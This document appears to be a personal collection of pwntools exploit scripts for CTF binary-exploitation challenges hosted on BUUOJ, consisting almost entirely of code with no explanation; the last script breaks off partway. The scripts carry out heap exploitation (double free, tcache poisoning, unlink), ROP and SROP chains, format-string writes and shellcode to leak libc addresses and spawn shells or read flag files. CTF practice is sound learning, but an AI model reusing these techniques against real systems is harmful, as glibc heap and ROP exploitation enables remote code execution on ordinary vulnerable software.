##### ycb_2020_easypwn



```python
from pwn import*
elf = ELF('easypwn')
libc = ELF('/home/kali/Desktop/libc6_2.23-0ubuntu10_amd64.so')
#p = process('./easypwn')
p = remote('node4.buuoj.cn',26581)
context.log_level = 'debug'

def add(size, name, message):
    p.sendlineafter(b'choice :', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', name)
    p.sendlineafter(b':', message)
def view():
    p.sendlineafter(b'choice :', b'2')
def delete(index):
    p.sendlineafter(b'choice :', b'3')
    p.sendlineafter(b':', str(index).encode())

add(0x20, b'a', b'a')
delete(0)
add(0x80, b'a', b'a')
add(0x20, b'a', b'b')
delete(2)
delete(1)
delete(0)
view()
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak - 88 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = libcbase + libc.sym['__malloc_hook']
one_gadget = libcbase + 0x4526a

add(0x60, b'a', b'a\n')
add(0x60, b'a', b'a\n')
delete(3)
delete(4)
delete(3)
add(0x60, p64(malloc_hook - 0x23), b'a')
add(0x60, b'a', b'a')
add(0x60, b'a', b'a')
payload = b'a' * 0x13 + p64(one_gadget)
add(0x60, payload, b'a')
p.sendlineafter(b'choice :', b'1')
p.interactive()
```





##### hwb_2019_mergeheap

```python
from pwn import*
elf = ELF('mergeheap')
libc = elf.libc
#p = process('./mergeheap')
p = remote('node4.buuoj.cn', 27498)
context.log_level = 'debug'

def add(size, content):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'len:', str(size).encode())
    p.sendafter(b'content:', content)
def show(index):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'idx:', str(index).encode())
def delete(index):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'idx:', str(index).encode())
def merge(index1, index2):
    p.sendlineafter(b'>>', b'4')
    p.sendlineafter(b'idx1:', str(index1).encode())
    p.sendlineafter(b'idx2:', str(index2).encode())


add(0x70, b'\n')
add(0x300, b'\n')
add(0x18, b'a' * 0x18)
add(0x18, b'a' * 0x18)
add(0x18, b'a' * 0x18)
add(0x18, b'a' * 0x18)
add(0x18, b'a' * 0x14 + b'\x31' +b'\x04' + b'\n')

merge(2, 3)
merge(4, 5)
merge(7, 8)
delete(0)
merge(9, 6)
delete(1)
add(0x300, b'\n')
show(2)
leak =  u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak - 96 - 0x10 - libc.sym['__malloc_hook']
free_hook = libcbase + libc.sym['__free_hook']
sys_addr = libcbase + libc.sym['system']

delete(4)
delete(3)
add(0x30, b'a' * 0x10 + p64(0) + p64(0x21) + p64(free_hook) + b'\n')
add(0x10, b'/bin/sh\x00' + b'\n')
add(0x10, p64(sys_addr) + b'\n')
delete(4)
p.interactive()
```



##### ycb_2020_easy_heap

```python
from pwn import*
elf = ELF('easy_heap')
libc = elf.libc
#p = process('./easy_heap')
p = remote('node4.buuoj.cn',27074)
context.log_level = 'debug'
context.arch = 'amd64'

def add(size):
    p.sendlineafter(b'Choice:', b'1')
    p.sendlineafter(b'Size:', str(size).encode())
def edit(index, content):
    p.sendlineafter(b'Choice:', b'2')
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendafter(b'Content:', content)
def delete(index):
    p.sendlineafter(b'Choice:', b'3')
    p.sendlineafter(b'Index:', str(index).encode())
def show(index):
    p.sendlineafter(b'Choice:', b'4')
    p.sendlineafter(b'Index:', str(index).encode())

add(0x410)
add(0x10)
delete(0)
add(0x420)
add(0x130)
show(2)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak - 1104 - 0x10 - libc.sym['__malloc_hook']

add(0x10)
delete(1)
delete(3)
add(0x18)
show(1)
p.recvuntil(b'Content: ')
heap_addr = u64(p.recv(6).ljust(8, b'\x00')) - 0x6c0

add(0x110)
payload1 = b'a' * 0xf0 + p64(0) + p64(0x21)
edit(3, payload1)
payload2 = p64(0) * 3 + p64(heap_addr + 0x2a0 + 0x20) + p64(0) + p64(0x131) + p64(heap_addr + 0x2a0) + p64(heap_addr + 0x2a0 + 8)
edit(2, payload2)
payload3 = b'a' * 0x10 + p64(0x130)
edit(1, payload3)

for i in range(7):
    add(0xf0)
for i in range(4, 11):
    delete(i)
delete(3)
add(0x100)
add(0x10)
add(0x10)
delete(4)
delete(5)

free_hook = libcbase + libc.sym['__free_hook']
setcontext = libcbase + libc.sym['setcontext']
magic_gadget = libcbase + 0x154b90
pop_rdi = libcbase + 0x26bb2
pop_rsi = libcbase + 0x2709c
pop_rdx_r12 = libcbase + 0x11c421
ret = libcbase + 0x256b9
mprotect = libcbase + libc.sym['mprotect']

edit(1, p64(free_hook))
add(0x10)
add(0x10)
edit(5, p64(magic_gadget))

payload = p64(0) + p64(heap_addr + 0x6e0) + p64(0) * 2 + p64(setcontext + 61)
payload = payload.ljust(0xa0, b'\x00')
payload += p64(heap_addr + 0x6e0 + 0x100) + p64(ret)
payload = payload.ljust(0x100, b'\x00')
payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7) + p64(0) + p64(mprotect)
payload += p64(heap_addr + 0x6e0 + 0x150)
payload = payload.ljust(0x150, b'\x00')
payload += asm(shellcraft.cat('flag'))

edit(0, payload)
delete(0)

p.interactive()
```





##### pwnable_bf



```python
from pwn import*
elf = ELF('./bf')
libc = elf.libc
p = process('./bf')
context.log_level = 'debug'

def getchar(gadget):
    l = len(gadget)
    gadget = int.from_bytes(gadget, byteorder='little', signed=True)
    for i in range(l):
        t = gadget & 0xff
        gadget = gadget >> 8
        p.send(p8(t))

payload = b'<' * 0x7c + b'.>' * 4 + b'<' * 24 + b',>' * 4 + b'>' * 24 + b',>' * 8 + b'.'

p.sendlineafter(b'[ ]', payload)

p.recvuntil(b'\n')
leak = u32(p.recv(4))
libcbase = leak - libc.sym['__libc_start_main']
sys_addr = libcbase + libc.sym['system']
gets = libcbase + libc.sym['gets']

getchar(p32(sys_addr))
getchar(p32(gets))
getchar(p32(0x80484e0))

p.sendline(b'/bin/sh\x00')
p.interactive()
```



##### VNCTF2021 hh



```python
from pwn import*
elf = ELF('hh')
libc = ELF('libc.so.6')
p = remote('node4.buuoj.cn', 27244)
#p = process('./hh')
context.log_level = 'debug'

def sendgadget(gadget):
    l = len(gadget) // 4
    gadget = int.from_bytes(gadget, byteorder='little', signed=True)
    result = b''
    for i in range(l):
        t = gadget & 0xffffffff
        result += p32(9) + p32(t) + p32(0xd) + p32(0x7d6 + i)
        gadget = gadget >> 32
    return result + p32(0xf)

p.sendlineafter(b'choice :', b'1')
code = p32(11) + p32(0x7d4) + p32(11) + p32(0x7d5) + p32(11) + p32(0x7d6 + 8) + p32(11) + p32(0x7d7 + 8)
code += p32(0xe) * 4 + p32(0xf)
p.sendafter(b'code:', code)
p.sendlineafter(b'choice :', b'2')
p.recvuntil(b'\n')

leak1 =  int(p.recvuntil(b'\n', drop=True), 16) << 32
leak2 = leak1 + int(p.recvuntil(b'\n', drop=True), 16)
leak3 =  int(p.recvuntil(b'\n', drop=True), 16) << 32
stack = leak3 + int(p.recvuntil(b'\n', drop=True), 16)
libcbase = leak2  - 240 - libc.sym['__libc_start_main']
pop_rdi = libcbase + 0x21112
pop_rsi = libcbase + 0x202f8
pop_rdx = libcbase + 0x1b92
pop_rax = libcbase + 0x3a738 
ret = libcbase + 0x937
syscall_ret = libcbase + 0xbc3f5


p.sendlineafter(b'choice :', b'1')
payload = flat(
    p64(pop_rdi), p64(stack + 0xb0),
    p64(pop_rsi), p64(0),
    p64(pop_rax), p64(2),
    p64(syscall_ret),

    p64(pop_rdi), p64(3),
    p64(pop_rsi), p64(stack + 0x100),
    p64(pop_rdx), p64(0x30),
    p64(pop_rax), p64(0),
    p64(syscall_ret),

    p64(pop_rdi), p64(1),
    p64(pop_rsi), p64(stack + 0x100),
    p64(pop_rdx), p64(0x30),
    p64(pop_rax), p64(1),
    p64(syscall_ret)
)
payload += b'flag'
code = sendgadget(payload)
p.sendafter(b'code:', code)
p.sendlineafter(b'choice :', b'2')
p.interactive()
```







##### rootersctf_2019_srop

```python
from pwn import*
elf = ELF('rootsrop')
#p = process('./rootsrop')
p  = remote('node4.buuoj.cn', 29139)
context.log_level = 'debug'
context.arch = 'amd64'

_data = 0x402000
pop_rax = 0x401032
syscall = 0x401046

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = _data
frame.rdx = 0x200
frame.rbp = _data + 0x8
frame.rip = pop_rax + 1
payload = b'a' * 0x88 + p64(pop_rax) + p64(15) + bytes(frame)

p.sendafter(b'CTF?', payload)
#pause()
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = _data
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload = b'/bin/sh\x00' + b'a' * 8 + p64(pop_rax) + p64(15) + bytes(frame)
p.send(payload)
p.interactive()
```





##### roarctf_2019_realloc_magic

```python
from pwn import*
elf = ELF('roarctf_2019_realloc_magic')
libc = elf.libc
#p = process('./roarctf_2019_realloc_magic')
global p
#context.log_level = 'debug'

def realloc(size, content):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Size?', str(size).encode())
    if size != 0:
        p.sendafter(b'Content?', content)
def free():
    p.sendlineafter(b'>> ', b'2')

def pwn():
    realloc(0x20, b'a')
    realloc(0, b'a')
    realloc(0xa0, b'a')
    realloc(0x80, b'a')
    for i in range(7):
        free()
    realloc(0, b'a')
    realloc(0x20, b'a')
    realloc(0x40, b'a' * 0x20 + p64(0) + p64(0x81) + b'\x60\xc7')
    realloc(0, b'a')
    realloc(0x80, b'a')
    realloc(0, b'a')
    realloc(0x80, p64(0xfbad1800) + p64(0) * 3 + b'\x00')
    leak =  u64(p.recvuntil(b'\x7f', timeout=1)[-6:].ljust(8, b'\x00'))
    libcbase = leak - 4118704
    free_hook = libcbase + libc.sym['__free_hook']
    onegadget = libcbase + 0x4f322

    p.sendlineafter(b'>> ', b'666')
    realloc(0x30, b'a')
    realloc(0, b'a')
    realloc(0xa0, b'a')
    realloc(0x80, b'a')
    for i in range(2):
        free()
    realloc(0, b'a')
    realloc(0x30, b'a')
    realloc(0x50, b'a' * 0x30 + p64(0) + p64(0x81) + p64(free_hook))
    realloc(0, b'a')
    realloc(0x80, b'a')
    realloc(0, b'a')
    realloc(0x80, p64(onegadget))
    free()
    p.interactive()
while True:
    try :
        p = remote('node4.buuoj.cn',28369)
        pwn()
    except Exception as e:
        p.close()
```



##### [OGeek2019 Final]OVM



```python
from pwn import*
elf = ELF('pwn1')
#libc = elf.libc
libc = ELF('/home/kali/Desktop/libc6_2.23-0ubuntu10_amd64.so')
#p = process('./pwn1')
p = remote('node4.buuoj.cn',25875)
#context.log_level = 'debug'

def sendcode(num):
    if num > 0x7fffffff :
        num = 0xffffffff - num + 1
        num = str(num)
        num = '-'+num
    else :
        num = str(num)
    return num.encode()

p.sendlineafter(b'PCPC:', b'0')
p.sendlineafter(b'SP:', b'1')
p.sendlineafter(b'CODE SIZE:', b'20')
p.recvuntil(b'CODE:')

p.sendline(sendcode(0x10000038))    #reg0 = 0x38
p.sendline(sendcode(0x80010200))    #reg1 = reg2 - reg0
p.sendline(sendcode(0x30040001))    #reg4 = memory[reg1]
p.sendline(sendcode(0x10000001))    #reg0 = 1
p.sendline(sendcode(0x70010100))    #reg1 = reg1 + reg0
p.sendline(sendcode(0x30050001))    #reg5 = memory[reg1]

p.sendline(sendcode(0x10000001))    #reg0 = 1
p.sendline(sendcode(0x10010008))    #reg1 = 8
p.sendline(sendcode(0xc0000001))    #reg0 = reg0 << reg1
p.sendline(sendcode(0x10010009))    #reg1 = 9
p.sendline(sendcode(0x70000001))    #reg0 = reg0 + reg1
p.sendline(sendcode(0x10010004))    #reg1 = 4
p.sendline(sendcode(0xc0000001))    #reg0 = reg0 << reg1
p.sendline(sendcode(0x70040400))    #reg4 = reg4 + reg0

p.sendline(sendcode(0x10000008))    #reg0 = 8
p.sendline(sendcode(0x80010200))    #reg1 = reg2 - reg0
p.sendline(sendcode(0x40040001))    #memory[reg1] = reg4
p.sendline(sendcode(0x10000001))    #reg0 = 1
p.sendline(sendcode(0x70010100))    #reg1 = reg1 + reg0
p.sendline(sendcode(0x40050001))    #memory[reg1] = reg5

#p.sendline(sendcode(0xff000000))

p.recvuntil(b'R4: ')
leak = int(p.recv(8), 16)
p.recvuntil(b'R5: ')
leak = (int(p.recv(4), 16) << 32) + leak
libcbase = leak + 8 - libc.sym['__free_hook']
print(hex(libcbase))
sys_addr = libcbase + libc.sym['system']
#gdb.attach(p)
#pause()
p.sendafter(b'?\n', b'/bin/sh\x00' + p64(sys_addr))
#pause()
p.interactive()
```





##### xman_2019_format



```python
from pwn import*
elf = ELF('xman_2019_format')
global p
#context.log_level = 'debug'
num1 = 0x38
num2 = 0x39

def pwn():
    payload = b'%10$p|'
    payload += b'%' + str(num1 + 4).encode() + b'c%10$hhn|%' + str(0xab).encode() + b'c%18$hhn|%' 
    payload += str(num2 + 4).encode() + b'c%10$hhn|%' + str(0x85).encode() + b'c%18$hhn'
    #gdb.attach(p)
    #pause()
    p.send(payload)
    p.recvuntil(b'58', timeout=1)
    #pause()
    p.interactive()

while True:
    try:
        #p = process('./xman_2019_format')
        p = remote('node4.buuoj.cn',27991)
        pwn()
    except Exception as e:
        p.close()
```





```python
from pwn import*
#p = process('./asm')
p =remote('node4.buuoj.cn',25239)
context.arch = 'amd64'
shellcode = asm(shellcraft.open('flag') + shellcraft.read('rax', 'rsp', 0x30) + shellcraft.write(1, 'rsp', 0x30))
#gdb.attach(p)
#pause()
p.sendafter(b'shellcode: ', shellcode)
p.interactive()
```



##### wdb_2018_1st_babyheap

```python
from pwn import*
elf = ELF('wdb_2018_1st_babyheap')
libc = ELF('/home/kali/Desktop/libc6_2.23-0ubuntu10_amd64.so')
#p = process('./wdb_2018_1st_babyheap')
p = remote('node4.buuoj.cn',29906)
#context.log_level = 'debug'

def alloc(index, content):
    p.sendlineafter(b'Choice:', b'1')
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendafter(b'Content:', content)
def edit(index, content):
    p.sendlineafter(b'Choice:', b'2')
    p.sendlineafter(b'Index:', str(index).encode())
    p.sendafter(b'Content:', content)
def show(index):
    p.sendlineafter(b'Choice:', b'3')
    p.sendlineafter(b'Index:', str(index).encode())
def free(index):
    p.sendlineafter(b'Choice:', b'4')
    p.sendlineafter(b'Index:', str(index).encode())

ptr = 0x602060

alloc(0, p64(0) + p64(0x31) + b'\n')
alloc(1, b'\n')
alloc(2, b'\n')
alloc(3, b'\n')
alloc(4, b'\n')
free(4)
free(2)
free(4)
show(4)
heap_addr = u64(p.recvuntil(b'\nD', drop=True).ljust(8, b'\x00')) - 0x60

alloc(5, p64(heap_addr + 0x10) + b'\n')
alloc(6, b'\n')
alloc(7, b'\n')
alloc(8, p64(0) * 2 + p64(0x20) + p64(0x90))
edit(0,  p64(0) + p64(0x21) + p64(ptr - 0x18) + p64(ptr - 0x10))
free(1)

edit(0, p64(0) * 3 + p64(ptr + 0x38))
edit(0, p64(0) * 2 + p64(elf.got['free']) + p64(3))
show(9)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak - libc.sym['free']
sys_addr = libcbase + libc.sym['system']
free_hook = libcbase + libc.sym['__free_hook']
edit(0, p64(free_hook) + b'\n')
edit(7, p64(sys_addr) + b'\n')
edit(3, b'/bin/sh\x00' + b'\n')
free(3)
p.interactive()
```



##### xman_2019_nooocall



```python
from pwn import*
elf = ELF('xman_2019_nooocall', checksec=False)
context.log_level="error"
#context.log_level = 'debug'

shellcode = '''
    mov al, 2
    shl rax, 32
    loop :
        mov bl, byte ptr [rax + {}]
        cmp bl, {}
        jz loop
'''
flag = 'flag{'
idx = 5
possablechar = '0123456789abcdf-}'

while True:
    for i in possablechar:
        char = ord(i)
        #p = process('./xman_2019_nooocall')
        p = remote('node4.buuoj.cn',29688)
        p.sendafter(b'>>', asm(shellcode.format(idx, char), arch='amd64'))
        t = p.can_recv(timeout = 2)
        if not t:
            flag += i
            idx += 1
            print(flag)
            #p.close()
            break

    if flag[-1:] == '}' :
        break
```



##### gwctf_2019_easy_pwn

```python
from pwn import* 
elf = ELF('gwctf_2019_easy_pwn')
libc = ELF('libc-2.23.so')
#p = process('./gwctf_2019_easy_pwn')
p = remote('node4.buuoj.cn',25203)
context.log_level = 'debug'

payload = b'I' * 16 + p32(elf.plt['puts']) + p32(0x8048e90) + p32(elf.got['puts'])

p.sendafter(b'name!', payload)
leak = u32(p.recvuntil(b'\xf7')[-4:])
libcbase = leak - libc.sym['puts']
sys_addr = libcbase + libc.sym['system']
bin_sh = libcbase + libc.search(b'/bin/sh\x00').__next__()

payload = b'I' * 16 + p32(sys_addr) + p32(0x8048e90) + p32(bin_sh)
p.sendafter(b'name!', payload)
p.interactive()
```



##### de1ctf_2019_weapon

```python
from pwn import*
elf = ELF('de1ctf_2019_weapon')
libc = elf.libc
global p
#context.log_level = 'debug'

def create(size, idx, content):
    p.sendlineafter(b'choice >>', b'1')
    p.sendlineafter(b'weapon:', str(size).encode())
    p.sendlineafter(b'index:', str(idx).encode())
    p.sendafter(b'name:', content)
def delete(idx):
    p.sendlineafter(b'choice >>', b'2')
    p.sendlineafter(b'idx', str(idx).encode())
def rename(idx, content):
    p.sendlineafter(b'choice >>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'content:', content)

def pwn():
    create(0x10, 0, b'a')
    create(0x60, 1, b'a')
    create(0x20, 2, b'a')
    create(0x10, 3, b'a')
    delete(0)
    delete(3)
    delete(1)
    rename(0, p64(0) + p64(0x21))
    rename(3, b'\x10')
    create(0x10, 4, b'a')
    create(0x10, 5, p64(0) + p64(0xa1))
    delete(1)

    create(0x10, 0, b'\xdd' + b'\x55')
    rename(5, p64(0) + p64(0x71))
    create(0x60, 1, b'a')
    payload = b'\x00' * 0x33 + p64(0xfbad1800) + p64(0) * 3 + b'\x00'
    create(0x60, 0, payload)
    leak = u64(p.recvuntil(b'\x7f', timeout=1)[-6:].ljust(8, b'\x00'))
    libcbase = leak + 0x20 - libc.sym['_IO_2_1_stdout_']
    malloc_hook = libcbase + libc.sym['__malloc_hook']
    one_gadget = libcbase + 0xf1147
    log.success('libcbase' + hex(libcbase))
    delete(1)
    rename(1, p64(malloc_hook - 0x23))
    create(0x60, 1, b'a')
    create(0x60, 0, b'\x00' * 0x13 + p64(one_gadget))

    p.sendlineafter(b'choice >>', b'1')
    p.sendlineafter(b'weapon:', b'1')
    p.sendlineafter(b'index:', b'0')
    p.interactive()

while True:
   try:
        p = remote('node4.buuoj.cn', 29584)
        pwn()
   except Exception as e:
       p.close()
```





##### hitcon_ctf_2019_one_punch



```python
from pwn import*
elf = ELF('hitcon_ctf_2019_one_punch')
libc = elf.libc
#p = process('./hitcon_ctf_2019_one_punch')
p =remote('node4.buuoj.cn',27110)
#context.log_level = 'debug'
context.arch = 'amd64'

def debut(idx, name):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'name:', name)
def rename(idx, name):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'name:', name)
def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())
def retire(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'idx:', str(idx).encode())
def gift(content):
    p.sendlineafter(b'>', b'50056')
    p.send(content)

debut(0 ,b'a' * 0x210)
retire(0)
for i in range(4):
    rename(0, p64(0) * 2)
    retire(0)

debut(0, b'a' * 0x310)
debut(1, b'a' * 0x310)
retire(0)
retire(1)
show(1)
p.recvuntil(b'name: ')
heap_addr = u64(p.recv(6).ljust(8, b'\x00')) - 0x260 - 0x220

for i in range(6):
    rename(0, p64(0) * 2)
    retire(0)
show(0)
p.recvuntil(b'name: ')
leak = u64(p.recv(6).ljust(8, b'\x00'))
libcbase = leak - 96 - 0x10 - libc.sym['__malloc_hook']
free_hook = libcbase + libc.sym['__free_hook']
malloc_hook = libcbase + libc.sym['__malloc_hook']
mprotect = libcbase + libc.sym['mprotect']
pop_rdi = libcbase + 0x26542
pop_rsi = libcbase + 0x26f9e
pop_rdx = libcbase + 0x12bda6
pop_rax = libcbase + 0x47cf8
syscall_ret = libcbase + 0xcf6c5

debut(1, b'a' * 0xf0)
debut(1, b'a' * 0x310)
debut(2, b'a' * 0x240)
retire(2)
retire(1)
for i in range(6):
    rename(2, p64(0) * 2)
    retire(2)
debut(1, b'a' * 0x320)
debut(1, b'a' * 0x310)
rename(2, p64(0) * 2)
retire(2)
retire(1)
debut(1, b'a' * 0x340)
debut(1, b'a' * 0x240)

payload = p64(0) * 5 + p64(0x221)  + p64(heap_addr + 0x570) + p64(malloc_hook - 0x38)
rename(2, payload)
debut(1, b'flag'.ljust(0x210, b'\x00'))
payload = p64(0) * 5 + p64(libcbase + 0x99540)
gift(payload)
'''
debut(0 ,b'a' * 0x210)
retire(0)
for i in range(5):
    rename(0, p64(0) * 2)
    retire(0)

debut(0, b'a' * 0x310)
debut(1, b'a' * 0x310)
retire(0)
retire(1)
show(1)
p.recvuntil(b'name: ')
heap_addr = u64(p.recv(6).ljust(8, b'\x00')) - 0x260 - 0x220

for i in range(6):
    rename(0, p64(0) * 2)
    retire(0)
show(0)
p.recvuntil(b'name: ')
leak = u64(p.recv(6).ljust(8, b'\x00'))

debut(2, b'a' * 0xf0)
debut(2, b'a' * 0x220)
payload = b'\x00' * 0xf0 + p64(0) + p64(0x221) + p64(0) + p64(heap_addr + 0x7a0) 
rename(0, payload)
payload = p64(0) + p64(0x221) + p64(heap_addr + 0x570) + p64(heap_addr + 0x20) + b'\x00' * 0x1f0 + p64(0x220) + p64(0xf0) 
rename(1, payload)
debut(1, b'a' * 0x210)
'''
#gdb.attach(p)
#pause()
payload = flat(
    p64(pop_rdi), p64(heap_addr + 0x580),
    p64(pop_rsi), p64(0),
    p64(pop_rax), p64(2),
    p64(syscall_ret),

    p64(pop_rdi), p64(3),
    p64(pop_rsi), p64(heap_addr),
    p64(pop_rdx), p64(0x30),
    p64(pop_rax), p64(0),
    p64(syscall_ret),

    p64(pop_rdi), p64(1),
    p64(pop_rsi), p64(heap_addr),
    p64(pop_rdx), p64(0x30),
    p64(pop_rax), p64(1),
    p64(syscall_ret)
)
payload = payload.ljust(0x300, b'\x00')
debut(1, payload)
#pause()
p.interactive()
```







##### ciscn_2019_es_4

```python
from pwn import*
elf = ELF('ciscn_2019_es_4')
libc = elf.libc
#p = process('./ciscn_2019_es_4')
p = remote('node4.buuoj.cn', 27432)
context.log_level = 'debug'

def malloc(index, size, content):
    p.sendlineafter(b'4.show', b'1')
    p.sendlineafter(b'index:', str(index).encode())
    p.sendlineafter(b'size:', str(size).encode())
    p.recvuntil(b'gift: ')
    t = int(p.recvuntil(b'\n', drop=True), 16)
    p.sendafter(b'content:', content)
    return t
def free(index):
    p.sendlineafter(b'4.show', b'2')
    p.sendlineafter(b'index:', str(index).encode())
def edit(index, content):
    p.sendlineafter(b'4.show', b'3')
    p.sendlineafter(b'index:', str(index).encode())
    p.sendafter(b'content:', content)
def show(index):
    p.sendlineafter(b'4.show', b'4')
    p.sendlineafter(b'index:', str(index).encode())

heap_addr = malloc(0x20 , 0xf8, b'a') - 0x260
malloc(8, 0xf0, b'a')
for i in range(1, 8):
    malloc(i , 0xf0, b'a')
for i in range(1, 8):
    free(i)

payload = p64(0) + p64(0xf1) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + b'\x00' * 0xd0 + p64(0xf0)
edit(0x20, payload)
free(8)
malloc(0x1f, 0xf0, b'a')
malloc(0x1e, 0xf0, b'a')
malloc(0x1d, 0xf0, b'a')
payload = p64(heap_addr + 0x270) + p64(heap_addr + 0x760) + p64(0x6021e0) * 2
edit(0x20, payload.ljust(0xf8, b'a'))
show(0x1d)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak - 96 - 0x10 - libc.sym['__malloc_hook']
free_hook = libcbase + libc.sym['__free_hook']
sys_addr = libcbase + libc.sym['system']

edit(0x1e, p64(free_hook))
malloc(8, 0xf0, b'/bin/sh\x00')
malloc(9, 0xf0, p64(sys_addr))
free(8)
p.interactive()
```







```pascal
from pwn import*
elf = ELF('checkin')
libc = elf.libc
global p
#p = process('./checkin', aslr=False)
#context.log_level = 'debug'
def pwn():
    payload = b'a' * 0xa0 + p64(0x404040 + 0xa0) + p64(0x4011bf)
    p.send(payload)
    payload = p64(0x40124a) + p64(0) + p64(1) + p64(0) + p64(0x404020) + p64(2) +p64(elf.got['read']) + p64(0x401230)
    payload += p64(0) + p64(0) + p64(1) + p64(0) + p64(0x404040 + 0xa0) + p64(0x50) + p64(elf.got['read']) + p64(0x401230) 
    payload += p64(0) * 3 + p64(0x404040 + 0xa0 + 0x20) #+ 
    payload += p64(0x404040 - 8) + p64(0x4011dd)

    p.send(payload)
    p.send(b'\x3d' + b'\x0f')
    payload = p64(0) + p64(0) + p64(0x404020) + p64(0x401230) + b'/bin/sh\x00'
    p.send(payload.ljust(0x3b, b'\x00'))
    
while True:
    try:
        p = remote('node4.buuoj.cn', 29481)
        pwn()
        p.interactive()
    except Exception as e:
        p.close() 
```





##### ycb_2020_mipspwn



```python
from pwn import*
elf = ELF('pwn2')
libc = ELF('./lib/libc.so.0')
#p = process(['qemu-mipsel', '-L', './', './pwn2'])
p = remote('node4.buuoj.cn', 28047)
context(arch='mips', log_level = 'debug')

gadget = 0x400798
puts_stubs = 0x401210
puts_got = 0x411550
free_got = 0x41151c
chunk_addr = 0x4115c8

p.sendafter(b'here:', p32(free_got) + p32(chunk_addr))

def create(id, size):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'ID:', str(id).encode())
    p.sendlineafter(b'big:', str(size).encode())
def throw(id):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'throw?', str(id).encode())
def write(id, content):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'write?', str(id).encode())
    p.sendlineafter(b'Content:', content)
def descrip(feeling):
    p.sendlineafter(b'choice:', b'7')
    p.sendafter(b'feeling:', feeling)

create(0, 0x50)
create(1, 0x50)
write(10, p32(puts_stubs))
write(11, p32(puts_got))
throw(0)

leak = u32(p.recvuntil(b'\x76')[-4:])
libcbase = leak - libc.sym['puts']
sys_addr = libcbase + libc.sym['system']
print(hex(libcbase))

write(10, p32(sys_addr))
create(2, 0x50)
write(2, b'/bin/sh')

throw(2)

payload = b'a' * 0x50 + p32(gadget) + p32(0)
payload += b'a' * 0x1c
payload += p32(0)    #s0
payload += p32(0)    #s1
payload += p32(0)    #s2
payload += p32(0)    #s3
payload += p32(0)    #ra

p.interactive()

#p.sendlineafter(b'choice: ', b'7')
#p.sendlineafter(b'feeling:') 
```





```python
from pwn import*
elf = ELF('wdb_2018_3rd_soEasy')
#libc = elf.libc
p = process('./wdb_2018_3rd_soEasy')

p.recvuntil(b'0x')
stack_addr = int(p.recvuntil(b'\n', drop=True), 16)
payload = asm(shellcraft.sh())
payload = payload.ljust(0x48, b'\x00')
payload += b'aaaa' + p32(stack_addr)
p.send(payload)
p.interactive()
```



##### jarvisoj_level6_x64

```python
from pwn import*
elf = ELF('freenote_x64')
libc = ELF('/home/kali/Desktop/libc6_2.23-0ubuntu10_amd64.so')
#p = process('./freenote_x64')
p = remote('node4.buuoj.cn',25397)
context.log_level = 'debug'

def list():
    p.sendlineafter(b'choice:', b'1')
def add(size, content):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'note:', str(size).encode())
    p.sendafter(b'note:', content)
def edit(index, size, content):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'number:', str(index).encode())
    p.sendlineafter(b'note:', str(size).encode())
    p.sendafter(b'note:', content)
def delete(index):
    p.sendlineafter(b'choice:', b'4')
    p.sendlineafter(b'number:', str(index).encode())

add(0x10, b'a' * 0x10)
add(0x10, b'a' * 0x10)
add(0x10, b'a' * 0x10)
add(0x10, b'a' * 0x10)
delete(0)
delete(2)
add(1, b'\x78')
list()
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
malloc_hook = leak - 88 - 0x10
libcbase = malloc_hook - libc.sym['__malloc_hook']
sys_addr = libcbase + libc.sym['system']

add(0x10, b'a' * 0x10)
edit(0, 8, b'a' * 8)
list()
p.recvuntil(b'a' * 8)
heap_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x1940
prt = heap_addr + 0x30
delete(0)
delete(1)
payload = p64(0) + p64(0x81) + p64(prt - 0x18) + p64(prt - 0x10) + b'\x00' * 0x60 + p64(0x80) + p64(0x90) + b'\x00' * 0x70
add(0x100, payload)
delete(1)

payload = p64(0x100) + p64(1) + p64(0x100) + p64(heap_addr + 0x18) + p64(1) + p64(8) + p64(0x602018)
payload += p64(1) + p64(8) + p64(heap_addr + 0x70) + p64(0) + b'/bin/sh\x00'
payload = payload.ljust(0x100, b'\x00')
edit(0, 0x100, payload)
edit(1, 8, p64(sys_addr))
delete(2)
p.interactive()
```





##### 360chunqiu2017_smallest

```python
from pwn import*
#elf = ELF('smallest')
#p = process('./smallest')
p = remote('node4.buuoj.cn',28273)
context.arch = 'amd64'
#context.log_level = 'debug'

payload = p64(0x4000b0) + p64(0x4000b3) + p64(0x4000b0)
p.send(payload)
sleep(1)
p.send(b'\xb3')
stack_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

